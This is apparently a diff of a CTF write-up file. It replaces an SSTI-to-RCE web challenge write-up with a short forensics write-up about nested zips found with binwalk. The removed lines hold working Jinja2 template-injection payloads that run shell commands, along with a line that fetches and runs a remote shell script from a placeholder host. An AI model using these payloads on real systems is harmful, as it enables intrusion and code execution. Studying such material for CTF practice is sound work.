@@ -1,147 +1,43 @@
 ---
-title: "Web CTF — Flight Panel (SSTI to RCE)"
-date: "2025-10-29"
-author: "th3mujd11"
-platform: "Custom"
-difficulty: "medium"
-category: "web"
-tags: [web, ssti, rce, enumeration, privesc]
-target: "http://flight-panel.ctf"
+title: "AC CTF - Fire and Ice"
+date: "2025-11-09"
+author: "someone"
+platform: "CTFd"
+difficulty: "TBD"
+category: Forensics"
+tags: [zip, nested files]
+target: ""
 ---
 
 # TL;DR
-
-Unauthenticated SSTI in a feedback form parameter allowed template evaluation. Verified with math, escalated to RCE using Jinja2 object chain, then read `/flag.txt`.
+Alright so we received a .zip file which unzipped contained flag.txt which contained a wrong flag. S i binwalked the original zip file and saw 3 more zips and the last one unzipped contained the flag.
 
 ```
-Foothold: SSTI in `name` -> Jinja2 eval
-Exploit: `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
-Flag: `/flag.txt` via `cat`
-```
+binwalk -e adofai.zip 
 
----
+                     /home/th3mujd11/Downloads/extractions/adofai.zip
+------------------------------------------------------------------------------------------
+DECIMAL                            HEXADECIMAL                        DESCRIPTION
+------------------------------------------------------------------------------------------
+0                                  0x0                                ZIP archive, file 
+                                                                      count: 1, total 
+                                                                      size: 226 bytes
+226                                0xE2                               ZIP archive, file 
+                                                                      count: 1, total 
+                                                                      size: 227 bytes
+453                                0x1C5                              ZIP archive, file 
+                                                                      count: 1, total 
+                                                                      size: 226 bytes
+------------------------------------------------------------------------------------------
+[+] Extraction of zip data at offset 0x0 completed successfully
+[+] Extraction of zip data at offset 0xE2 completed successfully
+[+] Extraction of zip data at offset 0x1C5 completed successfully
+------------------------------------------------------------------------------------------
 
-# Target Summary
+Analyzed 1 file for 85 file signatures (187 magic patterns) in 35.0 milliseconds
 
-- URL: `http://flight-panel.ctf`
-- Service: `HTTP/1.1` on port `80`
-- Tech (fingerprint): `Python`, `Flask`, `Jinja2`
-
----
-
-# Enumeration
-
-Quick recon of reachable endpoints and tech stack.
-
-```bash
-# Baseline scan
-whatweb http://flight-panel.ctf
-
-# Crawl/fuzz common paths
-feroxbuster -u http://flight-panel.ctf -t 50 -x html,txt,js -o ferox.txt
-
-# Inspect JS for hidden endpoints
-curl -s http://flight-panel.ctf/app.js | sed -n '1,200p'
-```
-
-Findings:
-- `/feedback` accepts `POST` with `name`, `email`, `message`.
-- Response echoes `name` inside a template — strong SSTI signal.
-
----
-
-# Foothold (SSTI)
-
-Probe the reflected context with harmless arithmetic to confirm server-side evaluation.
-
-```http
-POST /feedback HTTP/1.1
-Host: flight-panel.ctf
-Content-Type: application/x-www-form-urlencoded
-
-name={{7*7}}&email=a@b.c&message=hi
-```
-
-Expected: Page renders `49` where your name appears. That confirms SSTI.
-
-Next, identify the template engine. Common fingerprints for Jinja2:
-
-- Arithmetic worked; try attribute access or filters:
-
-```http
-name={{request.__class__.__name__}}
-```
-
-If you see `Request`, you're in Jinja2/Flask context.
-
----
-
-# Exploitation (Jinja2 to RCE)
-
-Use a built-in object to pivot into Python globals and `os.popen`.
-
-```http
-name={{ cycler.__init__.__globals__.os.popen('id').read() }}
-```
-
-If blocked, alternate gadgets:
-
-```http
-name={{ url_for.__globals__.os.popen('uname -a').read() }}
-name={{ lipsum.__globals__.os.popen('ls -la /').read() }}
-```
-
-Read the flag:
-
-```http
-name={{ url_for.__globals__.os.popen('cat /flag.txt').read() }}
-```
-
-Notes:
-- If templates are sand-boxed, look for import bypass (e.g., `__mro__`, `__subclasses__()`), or SSRF/file read alternatives.
-- If `os` access is filtered, try `config.items()` leakage or `get_flashed_messages.__globals__`.
-
----
-
-# Post-Exploitation
-
-Lightweight local enum to confirm context and secrets.
-
-```bash
-whoami && id
-env | sort
-ls -la /app || true
-```
-
-If a shell is needed, base64-encode payloads to avoid bad chars:
-
-```http
-name={{ url_for.__globals__.os.popen('bash -lc "curl http://YOURIP/shell.sh|bash"').read() }}
+ctf{281dbf950ada8e90f9320071fd871af042fd67d3bdf94043640b9ae673d0c952}
 ```
 
 ---
-
-# Proof of Flag
-
-```bash
-cat /flag.txt
-# flag{template-engines-cut-both-ways}
-```
-
----
-
-# Mitigations
-
-- Never render unsanitized user input in templates.
-- Disable template evaluation for user-facing fields; use escaping (`{{ variable | e }}`) and strong context separation.
-- Consider server-side allowlists for filters/functions or switch to a safe formatter.
-- Add WAF rules for common SSTI probes and monitor 500/400 spikes.
-
----
-
-# References
-
-- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
-- Flask/Jinja2 docs: https://flask.palletsprojects.com/ / https://jinja.palletsprojects.com/
-- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings
 
